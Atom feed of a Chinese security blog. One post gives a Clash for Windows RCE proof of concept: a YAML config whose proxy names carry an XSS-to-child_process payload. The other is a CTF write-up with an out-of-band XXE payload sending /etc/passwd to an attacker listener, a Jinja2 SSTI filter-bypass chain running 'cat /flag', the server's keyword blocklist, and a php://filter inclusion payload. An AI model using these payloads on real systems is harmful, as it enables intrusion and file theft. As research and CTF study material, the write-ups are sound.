<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>greetdawn&#39;s Blog</title>
  
  <subtitle>The God love people</subtitle>
  <link href="http://www.greetdawn.top/atom.xml" rel="self"/>
  
  <link href="http://www.greetdawn.top/"/>
  <updated>2022-03-02T03:15:54.294Z</updated>
  <id>http://www.greetdawn.top/</id>
  
  <author>
    <name>丨greetdawn丨</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Clash代理工具RCE</title>
    <link href="http://www.greetdawn.top/2022/03/02/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Clash%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7RCE/"/>
    <id>http://www.greetdawn.top/2022/03/02/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/Clash%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7RCE/</id>
    <published>2022-03-02T02:45:23.000Z</published>
    <updated>2022-03-02T03:15:54.294Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Clash：一个 Go 语言开发的多平台代理客户端</p></blockquote><span id="more"></span><h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>windows 版本（v 0.19.9版本及以下版本）</p><h1 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h1><h2 id="环境地址"><a href="#环境地址" class="headerlink" title="环境地址"></a>环境地址</h2><blockquote><p><a href="https://github.com/Fndroid/clash_for_windows_pkg/releases">https://github.com/Fndroid/clash_for_windows_pkg/releases</a></p></blockquote><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>利用<code>exp</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">port:</span> <span class="number">7890</span></span><br><span class="line"><span class="attr">socks-port:</span> <span class="number">7891</span></span><br><span class="line"><span class="attr">allow-lan:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">mode:</span> <span class="string">Rule</span></span><br><span class="line"><span class="attr">log-level:</span> <span class="string">info</span></span><br><span class="line"><span class="attr">external-controller:</span> <span class="string">:9090</span></span><br><span class="line"><span class="attr">proxies:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">a&lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);`);&gt;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">socks5</span></span><br><span class="line">    <span class="attr">server:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">    <span class="attr">port:</span> <span class="string">&quot;17938&quot;</span></span><br><span class="line">    <span class="attr">skip-cert-verify:</span> <span class="literal">true</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">abc</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">socks5</span></span><br><span class="line">    <span class="attr">server:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">    <span class="attr">port:</span> <span class="string">&quot;8088&quot;</span></span><br><span class="line">    <span class="attr">skip-cert-verify:</span> <span class="literal">true</span></span><br><span class="line"> </span><br><span class="line"><span class="attr">proxy-groups:</span></span><br><span class="line">  <span class="bullet">-</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">&lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);`);&gt;</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">select</span></span><br><span class="line">    <span class="attr">proxies:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">a&lt;img/src=&quot;1&quot;/onerror=eval(`require(&quot;child_process&quot;).exec(&quot;calc.exe&quot;);`);&gt;</span></span><br></pre></td></tr></table></figure><p>直接本地构造<code>exp.yaml</code>文件，在<code>clash</code>中导入</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/202203021110598.png" alt="image-20220302111057449"></p><p>点击<code>proxies</code>直接触发<code>exp</code>弹出计算器</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/202203021112184.png" alt="image-20220302111217112"></p><h2 id="修复意见"><a href="#修复意见" class="headerlink" title="修复意见"></a>修复意见</h2><p>直接更新官方版本到最近即可</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;Clash：一个 Go 语言开发的多平台代理客户端&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="安全研究" scheme="http://www.greetdawn.top/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/"/>
    
    
    <category term="Clash" scheme="http://www.greetdawn.top/tags/Clash/"/>
    
  </entry>
  
  <entry>
    <title>2022赛宁网安ctf面试题</title>
    <link href="http://www.greetdawn.top/2022/02/15/%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/ctf-wp-saining/"/>
    <id>http://www.greetdawn.top/2022/02/15/%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/ctf-wp-saining/</id>
    <published>2022-02-15T08:34:16.000Z</published>
    <updated>2022-02-25T16:15:20.954Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境地址"><a href="#环境地址" class="headerlink" title="环境地址"></a>环境地址</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">61.147.171.107:10081</span><br><span class="line">61.147.171.107:10082</span><br><span class="line">61.147.171.107:10083</span><br></pre></td></tr></table></figure><span id="more"></span><h1 id="10081-xml注入"><a href="#10081-xml注入" class="headerlink" title="10081 xml注入"></a>10081 xml注入</h1><p>访问源代码分析，感觉应该的是个xml外部实体注入</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215220552138.png"></p><p>先构造payload试一哈：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>确实存在，但是有过滤</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215220635177.png" alt="image-20220215220635177"></p><p>尝试使用参数型实体方式注入：</p><p><code>vps</code>构造<code> test.dtd</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://192.168.31.79:8888?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>开启端口监听：<code>nc -lvvp 8888</code></p><p>攻击payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE convert [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://139.196.234.164:8899/test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215221604181.png" alt="image-20220215221604181"></p><p>成功返回加密字符串，解密后获取</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215221634222.png" alt="image-20220215221634222"></p><p>修改<code>test.dtd</code>获取<code>test.php</code>源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=test.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://192.168.31.79:8888?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>发包获取到源码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">function showAttrs($attrs) &#123;</span><br><span class="line">    $r = [&quot;&quot;];</span><br><span class="line">    foreach ($attrs as $k =&gt; $v) &#123;</span><br><span class="line">        array_push($r, $k . &quot;=\&quot;&quot; . $v-&gt;textContent . &quot;\&quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    return implode(&quot; &quot;, $r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function showNode($n, $pre) &#123;</span><br><span class="line">    if ($n-&gt;hasChildNodes()) &#123;</span><br><span class="line">        echo $pre . &quot;&lt;&quot; . $n-&gt;nodeName . showAttrs($n-&gt;attributes) . &quot;&gt;\n&quot;;</span><br><span class="line">        foreach ($n-&gt;childNodes as $c) &#123;</span><br><span class="line">            show($c, $pre . &quot; &quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        echo $pre . &quot;&lt;/&quot; . $n-&gt;nodeName . &quot;&gt;\n&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo $pre . &quot;&lt;&quot; . $n-&gt;nodeName . showAttrs($n-&gt;attributes) . &quot;/&gt;\n&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function show($n, $pre) &#123;</span><br><span class="line">    switch ($n-&gt;nodeType) &#123;</span><br><span class="line">        case XML_ELEMENT_NODE:</span><br><span class="line">            showNode($n, $pre);</span><br><span class="line">            break;</span><br><span class="line"></span><br><span class="line">        case XML_TEXT_NODE:</span><br><span class="line">        case XML_CDATA_SECTION_NODE:</span><br><span class="line">        case XML_ENTITY_REF_NODE:</span><br><span class="line">            echo $pre . $n-&gt;textContent . &quot;\n&quot;;</span><br><span class="line">            break;</span><br><span class="line">        </span><br><span class="line">        case XML_COMMENT_NODE:</span><br><span class="line">            echo $pre . &quot;&lt;!--&quot; . $n-&gt;textContent . &quot;--&gt;\n&quot;;</span><br><span class="line">            break;</span><br><span class="line"></span><br><span class="line">        case XML_DOCUMENT_NODE:</span><br><span class="line">            foreach ($n-&gt;childNodes as $c) &#123;</span><br><span class="line">                show($c, $pre);</span><br><span class="line">            &#125;</span><br><span class="line">            break;</span><br><span class="line"></span><br><span class="line">        default:</span><br><span class="line">        echo &quot;Nope&quot;;</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) &#123;</span><br><span class="line">    $d = new DOMDocument();</span><br><span class="line">    $data = file_get_contents(&quot;php://input&quot;);</span><br><span class="line">    if(preg_match(&#x27;/file|rot13/i&#x27;, $data))</span><br><span class="line">    &#123;</span><br><span class="line">        die(&#x27;illegal!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    $d-&gt;loadXML($data, LIBXML_BIGLINES | LIBXML_COMPACT | LIBXML_DTDVALID | LIBXML_NOBLANKS |LIBXML_NOERROR | LIBXML_NOWARNING | LIBXML_NOENT);</span><br><span class="line"></span><br><span class="line">    if ($d-&gt;validate()) &#123;</span><br><span class="line">        show($d, &quot;&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;è¿å¥½åä¸æ¯ä¸ªè§èçè¯­å¥å¦&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo (&quot;è¯·æ±æ¹å¼æè¯¯&quot;);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>看了一下源码没啥东西</p><p>应该不用源码审计，猜测flag可能存在路径下，修改test.dtd包含一下看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://192.168.31.79:8888?p=%file;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215222612642.png" alt="image-20220215222612642"></p><p>确实有值，解密后成功拿到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZmxhZ3tYUE9aVGQ2NkZhQU1zVXNUcng3QzJ2cURCVm1nRXFiYn0K</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215222649524.png" alt="image-20220215222649524"></p><h2 id="flag-flag-XPOZTd66FaAMsUsTrx7C2vqDBVmgEqbb"><a href="#flag-flag-XPOZTd66FaAMsUsTrx7C2vqDBVmgEqbb" class="headerlink" title="flag:flag{XPOZTd66FaAMsUsTrx7C2vqDBVmgEqbb}"></a>flag:flag{XPOZTd66FaAMsUsTrx7C2vqDBVmgEqbb}</h2><h1 id="10082-ssti模板注入"><a href="#10082-ssti模板注入" class="headerlink" title="10082 ssti模板注入"></a>10082 ssti模板注入</h1><p>请求获取源码，分析源码，获得变量入口点，首先传参变量是name, 构造<code>/?name=&#123;&#123;4*4&#125;&#125;</code></p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215165423675.png" alt="image-20220215165423675"></p><p>呦西 ，确实有ssti！</p><p>不过存在过滤，几乎把能过滤的东西都过滤了，过滤的死死滴</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blackwords = [<span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;attr&#x27;</span>, <span class="string">&#x27;mro&#x27;</span>, <span class="string">&#x27;base&#x27;</span>, <span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;session&#x27;</span>, <span class="string">&#x27;add&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;ord&#x27;</span>, <span class="string">&#x27;redirect&#x27;</span>, <span class="string">&#x27;url_for&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;get_flashed_messages&#x27;</span>, <span class="string">&#x27;get&#x27;</span>, <span class="string">&#x27;subclasses&#x27;</span>, <span class="string">&#x27;form&#x27;</span>, <span class="string">&#x27;cookies&#x27;</span>, <span class="string">&#x27;headers&#x27;</span>, <span class="string">&#x27;local&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;dir&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;print&#x27;</span>, <span class="string">&#x27;and&#x27;</span>,<span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;&#123;&#125;&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;+&#x27;</span>]</span><br></pre></td></tr></table></figure><p>那就绕吧，怎么绕呢？</p><p>这里可以利用的点就是使用jinja2自身的过滤器进行bypass</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set org = (&#123; &#125;|select()|string()) %&#125;&#123;&#123;org&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215172249858.png" alt="image-20220215172249858"></p><p>编写获取对应字符串搜索脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/env python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># author:greetdawn</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://61.147.171.107:10082/?name=&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&#123;&#123;% set sstr = ((app.__doc__|string|list).pop(&#123;num&#125;)|string) %&#125;&#125;&#123;&#123;&#123;&#123;sstr&#125;&#125;&#125;&#125;&quot;</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">300</span>):</span><br><span class="line">r = requests.get(url + payload.<span class="built_in">format</span>(num=i))</span><br><span class="line"><span class="comment"># print(r.text)</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] paylaod: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(payload.<span class="built_in">format</span>(num=i)))</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;search &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i))</span><br></pre></td></tr></table></figure><p>依次获取更多字符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set xhx = ((&#123; &#125;|select|string|list).pop(24)|string) %&#125;&#123;&#123;xhx&#125;&#125; # _</span><br><span class="line">&#123;% set space = ((&#123; &#125;|select|string|list).pop(10)|string) %&#125;    # 空格</span><br><span class="line">&#123;% set left = ((app.__doc__|string|list).pop(171)|string) %&#125; &#123;&#123;left&#125;&#125; # (</span><br><span class="line">&#123;% set right = ((app.__doc__|string|list).pop(182)|string) %&#125; &#123;&#123;right&#125;&#125; # )</span><br><span class="line">&#123;% set yin = ((app.__doc__|string|list).pop(177)|string) %&#125; # 单引号 &#x27;</span><br><span class="line">&#123;% set point = ((app.__doc__|string|list).pop(26)|string) %&#125; &#123;&#123;point&#125;&#125; # .</span><br><span class="line"></span><br><span class="line">&#123;% set but = dict(buil=aa,tins=dd)|join %&#125;    # builtins</span><br><span class="line">&#123;% set imp = dict(imp=aa,ort=dd)|join %&#125;&#123;&#123;imp&#125;&#125; # import</span><br><span class="line">&#123;% set pon = dict(po=aa,pen=dd)|join %&#125;&#123;&#123;pon&#125;&#125; # popen</span><br><span class="line">&#123;% set os = dict(o=aa,s=dd)|join %&#125;&#123;&#123;os&#125;&#125;    # os</span><br><span class="line">&#123;% set ca = dict(ca=aa,t=dd)|join %&#125;    # cat</span><br><span class="line">&#123;% set flg = dict(fl=aa,ag=dd)|join %&#125;    # flag</span><br><span class="line">&#123;% set ev = dict(ev=aa,al=dd)|join %&#125;    # eval</span><br><span class="line">&#123;% set red = dict(re=aa,ad=dd)|join %&#125; &#123;&#123;red&#125;&#125; # read</span><br><span class="line">&#123;% set bul = xhx*2~but~xhx*2 %&#125;    # __builtins__</span><br><span class="line"></span><br><span class="line">&#123;% set zero = (self|int) %&#125;    # 0, 也可以使用lenght过滤器获取数字</span><br><span class="line">&#123;% set one = (zero**zero)|int %&#125;    # 1</span><br><span class="line">&#123;% set two = (zero-one-one)|abs %&#125;    # 2</span><br><span class="line">&#123;% set four = (two*two)|int %&#125;    # 4</span><br><span class="line">&#123;% set five = (two*two*two)-one-one-one %&#125;    # 5</span><br><span class="line">&#123;% set three = five-one-one %&#125;    # 3</span><br><span class="line">&#123;% set nine = (two*two*two*two-five-one-one) %&#125;    # 9</span><br><span class="line">&#123;% set seven = (zero-one-one-five)|abs %&#125;    # 7</span><br><span class="line">&#123;% set c = dict(c=aa)|reverse|first %&#125;    # 字符 c</span><br><span class="line">&#123;% set bfh = self|string|urlencode|first %&#125;    # 百分号 %</span><br><span class="line">&#123;% set bfhc = bfh~c %&#125;    # 这里构造了%c, 之后可以利用这个%c构造任意字符。~用于字符连接</span><br><span class="line">&#123;% set slas = bfhc%((four~seven)|int) %&#125;    # 使用%c构造斜杠 /</span><br></pre></td></tr></table></figure><p>根据以上获取字符串进行拼接获取<code>payload:``__import__(’os‘).popen(‘cat /flag’).read()</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">http://61.147.171.107:10082/?name=&#123;% set zero = (self|int) %&#125;</span><br><span class="line">&#123;% set one = (zero**zero)|int %&#125;</span><br><span class="line">&#123;% set two = (zero-one-one)|abs %&#125;</span><br><span class="line">&#123;% set four = (two*two)|int %&#125;</span><br><span class="line">&#123;% set five = (two*two*two)-one-one-one %&#125;</span><br><span class="line">&#123;% set three = five-one-one %&#125;</span><br><span class="line">&#123;% set nine = (two*two*two*two-five-one-one) %&#125;</span><br><span class="line">&#123;% set seven = (zero-one-one-five)|abs %&#125;</span><br><span class="line">&#123;% set c = dict(c=aa)|reverse|first %&#125;</span><br><span class="line">&#123;% set bfh = self|string|urlencode|first %&#125;</span><br><span class="line">&#123;% set bfhc = bfh~c %&#125;</span><br><span class="line">&#123;% set slas = bfhc%((four~seven)|int) %&#125;</span><br><span class="line">&#123;% set space = ((&#123; &#125;|select|string|list).pop(10)|string) %&#125;</span><br><span class="line">&#123;% set yin = ((app.__doc__|string|list).pop(177)|string) %&#125;</span><br><span class="line">&#123;% set xhx = ((&#123; &#125;|select|string|list).pop(24)|string) %&#125;</span><br><span class="line">&#123;% set left = ((app.__doc__|string|list).pop(171)|string) %&#125;</span><br><span class="line">&#123;% set right = ((app.__doc__|string|list).pop(182)|string) %&#125;</span><br><span class="line">&#123;% set point = ((app.__doc__|string|list).pop(26)|string) %&#125;</span><br><span class="line">&#123;% set but = dict(buil=aa,tins=dd)|join %&#125;</span><br><span class="line">&#123;% set imp = dict(imp=aa,ort=dd)|join %&#125;</span><br><span class="line">&#123;% set pon = dict(po=aa,pen=dd)|join %&#125;</span><br><span class="line">&#123;% set exo = dict(o=aa,s=dd)|join %&#125;</span><br><span class="line">&#123;% set ca = dict(ca=aa,t=dd)|join %&#125;</span><br><span class="line">&#123;% set flg = dict(fl=aa,ag=dd)|join %&#125;</span><br><span class="line">&#123;% set ev = dict(ev=aa,al=dd)|join %&#125;</span><br><span class="line">&#123;% set red = dict(re=aa,ad=dd)|join %&#125;</span><br><span class="line">&#123;% set bul = xhx*2~but~xhx*2 %&#125; </span><br><span class="line">&#123;% set pld = xhx*2~imp~xhx*2~left~yin~exo~yin~right~point~pon~left~yin~ca~space~slas~flg~yin~right~point~red~left~right %&#125;</span><br><span class="line">&#123;&#123;pld&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215215529181.png" alt="image-20220215215529181"></p><p>带入万能payload构造eval执行命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> f,v <span class="keyword">in</span> whoami.__init__.__globals__.items() %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> f == bul %&#125; </span><br><span class="line">        &#123;% <span class="keyword">for</span> a,b <span class="keyword">in</span> v.items() %&#125;</span><br><span class="line">            &#123;% <span class="keyword">if</span> a == ev %&#125;</span><br><span class="line">                &#123;&#123;b(pld)&#125;&#125; </span><br><span class="line">            &#123;% endif %&#125;</span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215215549758.png" alt="image-20220215215549758"></p><h2 id="flag-flag-m6WMnd6PKJyuxepVxGjgUCpl7JzWyDjS"><a href="#flag-flag-m6WMnd6PKJyuxepVxGjgUCpl7JzWyDjS" class="headerlink" title="flag : flag{m6WMnd6PKJyuxepVxGjgUCpl7JzWyDjS}"></a>flag : flag{m6WMnd6PKJyuxepVxGjgUCpl7JzWyDjS}</h2><h1 id="10083-文件包含"><a href="#10083-文件包含" class="headerlink" title="10083 文件包含"></a>10083 文件包含</h1><p>请求看源码，典型的文件包含，传入变量<code>file1</code>和<code>file2</code></p><p><code>payload：</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file1=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class="line">file2=data:text/plain,hello ctf</span><br></pre></td></tr></table></figure><p>利用data协议传入原始文件流，利用php://filter协议包含flag.php文件源码</p><p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20220215164654261.png" 